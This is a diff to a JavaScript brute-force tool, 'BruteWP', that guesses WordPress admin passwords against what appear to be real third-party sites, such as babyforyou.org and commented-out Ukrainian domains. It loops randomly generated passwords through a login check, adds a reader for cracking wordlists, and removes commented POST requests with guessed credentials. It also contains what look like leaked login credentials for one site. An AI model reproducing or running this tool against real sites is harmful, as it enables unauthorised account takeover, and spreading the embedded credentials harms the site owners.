@@ -29,6 +29,11 @@ class BruteWP {
         // this.login = "Garbis";
         this.url = "https://babyforyou.org/wp-admin/";
         this.login = "badmin";
+
+
+
+        return;
+
         new Promise((resolve,reject) => {
             console.time("Brute Work");
             this.n = 0;
@@ -45,9 +50,12 @@ class BruteWP {
 
         });
 
+
+
+
     }
     async bruteInit() {
-        // return new Promise(async (resolve, reject) => {
+
         //     let url = "https://babyforyou.org/wp-admin/";
             // let url = "https://artemida.ua/wp-admin/";
             // let url = "https://holiday.ua/wp-admin/";
@@ -68,10 +76,7 @@ class BruteWP {
                 // status = await this.checkPassword({login:"museum-user",password:"H01eOiLTQjxagz5by5"},page);
 
                 do {
-                    status = await this.checkPassword(
-                        {login:this.login,
-                            password:this.generatePassword( Math.floor((Math.random() * (25 - 6)) + 6)) },
-                            page);
+                    status = await this.checkPassword({login:this.login, password:this.generatePassword( Math.floor((Math.random() * (25 - 6)) + 6)) }, page);
 
                     this.n++;
                     if (Number.isInteger(this.n/100)) {
@@ -82,31 +87,7 @@ class BruteWP {
                 this.stop = true;
                 console.log("FIND PASSWORD", this.login, status);
             });
-            // needle.get("https://garbis.com.ua/wp-login.php", {},(err, res) => { // { agent: myAgent },
-            //     console.log(res);
-            //     if (err) {
-            //         console.log(err,'err1');
-            //     }
-            //     // console.log(res,'res1')
-            // });
 
-            // needle.post("https://garbis.com.ua/wp-login.php", "log=Garbis&pwd=nE3qMdsLPRA1g&wp-submit=%D0%92%D0%BE%D0%B9%D1%82%D0%B8",(err, res) => { // { agent: myAgent },
-            //     console.log(res);
-            //     if (err) {
-            //         console.log(err,'err2');
-            //     }
-            //     console.log(res,'res2')
-            // });
-
-            // needle.post("https://garbis.com.ua/wp-login.php", "log=Garbis&pwd=nE3qMdsLPRAg&wp-submit=%D0%92%D0%BE%D0%B9%D1%82%D0%B8&redirect_to=https%3A%2F%2Fgarbis.com.ua%2Fwp-admin%2F&testcookie=1",(err, res) => { // { agent: myAgent },
-            //     console.log(res);
-            //     if (err) {
-            //         console.log(err,'err3');
-            //     }
-            //     console.log(res,'res3')
-            // });
-
-        // });
     }
     async checkPassword(data,page) {
         return new Promise(async (resolve, reject) => {
@@ -154,6 +135,20 @@ class BruteWP {
             password += chars.substr(randomInt(chars.length),1);
         }
         return password;
+    }
+    generateFilePassword () {
+        let stream = new fs.ReadStream(path.join(__dirname, '/BruteLibs/oCustom-WPATop/oCustom-WPA.txt'), {encoding: "utf-8"});
+        // let stream = new fs.ReadStream(path.join(__dirname, '/BruteLibs/PsycOPacK/Pre-Expantion Wordlists/MalenamesCaps.txt'), {encoding: "utf-8"});
+        let n = 0;
+        stream.on('readable', async function() {
+            await new Promise(async (resolve, reject) => {setTimeout(()=>{resolve()},1000)});
+            n++;
+            let data = stream.read().split(/\n|\r\n/);
+            console.log(data[data.length - 1], n, data.length);
+        });
+        stream.on('end', function(){
+            console.log("THE END");
+        });
     }
 }
 
